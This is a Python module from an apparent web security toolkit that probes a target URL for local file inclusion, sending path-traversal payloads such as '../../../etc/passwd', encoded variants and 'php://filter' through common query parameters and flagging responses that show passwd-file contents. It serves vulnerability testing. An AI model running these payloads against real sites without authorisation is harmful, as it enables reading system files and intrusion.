# modules/web/lfi_rfi_tester.py
from core.models import ToolResult, Finding, Severity

TOOL_INFO = {
    "name": "lfi_rfi_tester",
    "category": "web",
    "description": "Local/Remote File Inclusion vulnerability testing",
    "author": "CyberToolkit Pro",
    "version": "1.0.0",
    "args": [
        {"name": "target", "required": True, "description": "Target to analyze"},
    ],
    "tags": ['web', 'lfi', 'rfi', 'inclusion', 'vulnerability'],
}


def run(args):

    import urllib.request, urllib.error, urllib.parse, re
    target = args.get("target", "")
    if not target:
        return ToolResult(tool_name="lfi_rfi_tester", status="error", error="No target specified")
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"
    data = {"target": target, "tests": [], "vulnerabilities": []}
    findings = []
    lfi_payloads = [
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd", "....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "file:///etc/passwd",
    ]
    lfi_indicators = ["root:x:0:0", "root:*:0:0", "daemon:x:", "nobody:", "127.0.0.1"]
    test_params = ["file", "page", "path", "include", "doc", "document", "folder", "root", "pg", "template"]
    for param in test_params[:5]:
        for payload in lfi_payloads[:4]:
            test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=8) as resp:
                    body = resp.read(10000).decode("utf-8", errors="replace")
                    if any(indicator in body for indicator in lfi_indicators):
                        data["vulnerabilities"].append({"param": param, "payload": payload, "type": "LFI"})
                        findings.append(Finding(
                            title=f"Local File Inclusion via '{param}'",
                            severity=Severity.CRITICAL,
                            description=f"System file contents exposed through parameter '{param}'",
                            evidence=f"Payload: {payload}",
                            remediation="Never use user input in file path operations; use a whitelist of allowed files"
                        ))
                        break
            except Exception:
                pass
            data["tests"].append({"param": param, "payload": payload})
    return ToolResult(tool_name="lfi_rfi_tester", target=target, status="success", data=data, findings=findings)

